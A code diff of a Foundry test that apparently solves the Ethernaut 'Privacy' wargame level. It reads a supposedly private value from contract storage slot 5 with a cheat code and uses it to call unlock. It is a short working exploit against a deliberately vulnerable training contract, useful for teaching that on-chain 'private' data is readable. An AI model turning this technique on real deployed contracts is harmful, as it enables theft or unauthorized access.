@@ -36,7 +36,20 @@ contract PrivacyTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
-    
+        // Cheat code to load contract storage at specific slot
+        bytes32 secretData = vm.load(levelAddress, bytes32(uint256(5)));
+
+        // Log bytes stored at that memory location
+        emit log_bytes(abi.encodePacked(secretData)); 
+
+        // Not relevant to completing the level but shows how we can split a bytes32 into its component parts
+        bytes16[2] memory secretDataSplit = [bytes16(0), 0];
+        assembly {
+            mstore(secretDataSplit, secretData)
+            mstore(add(secretDataSplit, 16), secretData)
+        }
+
+        ethernautPrivacy.unlock(bytes16(secretData));
 
         //////////////////////
         // LEVEL SUBMISSION //
@@ -44,6 +57,6 @@ contract PrivacyTest is DSTest {
 
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
-        // assert(levelSuccessfullyPassed);
+        assert(levelSuccessfullyPassed);
     }
 }
